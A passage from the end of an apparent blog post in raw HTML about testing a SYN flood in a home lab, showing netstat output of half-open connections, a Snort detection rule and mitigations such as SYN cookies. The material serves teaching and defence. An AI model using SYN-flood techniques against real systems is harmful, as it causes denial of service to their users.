class=\"hljs-number\">192.168.3.1:1257</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1201</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1275</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1116</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1167</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:2060</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1877</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1888</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1176</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1884</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1139</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:2055</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1137</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1160</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1091</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1098</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:2068</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:2037</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:2071</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:2034</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1894</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1156</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1092</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1886</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:2064</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1889</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1177</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1107</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1085</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>  <span class=\"hljs-number\">40152</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.1.207:59318</span>     ESTABLISHED <span class=\"hljs-number\">4638</span>/sshd: user<span class=\"hljs-meta\"> [p\ntcp6       0      0 ::1:25                  :::*                    LISTEN      790/exim4\ntcp6       0      0 :::111                  :::*                    LISTEN      500/rpcbind\ntcp6       0      0 :::39185                :::*                    LISTEN      509/rpc.statd\ntcp6       0      0 :::22                   :::*                    LISTEN      525/sshd\nroot@ajax:~#\n</span></code></pre>\n<p>As we can see, there is a lot of connections placed in a <code>SYN_RECV</code> state meaning the virtual machine replied with a <code>SYN-ACK</code> but is waiting for an <code>ACK</code> from the spoofed address. I never ran the program to completion but if had done that, there would be thousands of connections stuck in a <code>SYN_RECV</code> state, potentially causing a denial of service.</p>\n<h2>Detection</h2>\n<p>Using an <strong>Intrusion Detection System</strong> such as Snort, it's possible to detect SYN flood attacks. Since I am running Snort in my network, I decided to create a snort rule to detect when running my SYN flooder program. Below you will find the rule:</p>\n<pre><code class=\"hljs language-less\"><span class=\"hljs-selector-tag\">alert</span> <span class=\"hljs-selector-tag\">tcp</span> <span class=\"hljs-selector-tag\">any</span> <span class=\"hljs-selector-tag\">any</span> <span class=\"hljs-selector-tag\">-</span>> <span class=\"hljs-selector-tag\">192</span><span class=\"hljs-selector-class\">.168</span><span class=\"hljs-selector-class\">.1</span><span class=\"hljs-selector-class\">.0</span>/<span class=\"hljs-selector-tag\">24</span> <span class=\"hljs-selector-tag\">any</span> ( <span class=\"hljs-attribute\">msg</span>:<span class=\"hljs-string\">\"Possible SYN flood\"</span>; <span class=\"hljs-attribute\">classtype</span>:attempted-dos; <span class=\"hljs-attribute\">sid</span>:<span class=\"hljs-number\">1999999</span>; <span class=\"hljs-attribute\">flags</span>:S; <span class=\"hljs-attribute\">flow</span>: stateless; <span class=\"hljs-attribute\">detection_filter</span>: track by_dst, count <span class=\"hljs-number\">50</span>, seconds <span class=\"hljs-number\">10</span>;)\n</code></pre>\n<p>This rule will alert every SYN packet during one sampling period of 10 seconds, after the first 50 SYN packets. However this rule may not apply for all network environments. Depending on your needs you may need to increase/decrease the count or amount of seconds.</p>\n<h2>Conclusion</h2>\n<p>Protecting against DoS attacks, particular SYN flood attacks with spoofing can be difficult. But there are some security measures that can be taken which will hopefully reduce the effects of a DoS attack. Using SYN cookies, IDS/IPS or simply reducing time spent in <code>SYN_RECV</code> state are all possible methods to stop or reduce DoS attacks.</p>\n<p>More information about protecting against SYN flood attacks can be found in the <a href=\"https://tools.ietf.org/html/rfc4987\">RFC 4987</a>. Writing rules for snort: <a href=\"http://manual-snort-org.s3-website-us-east-1.amazonaws.com/node27.html\">http://manual-snort-org.s3-website-us-east-1.amazonaws.com/node27.html</a></p>"}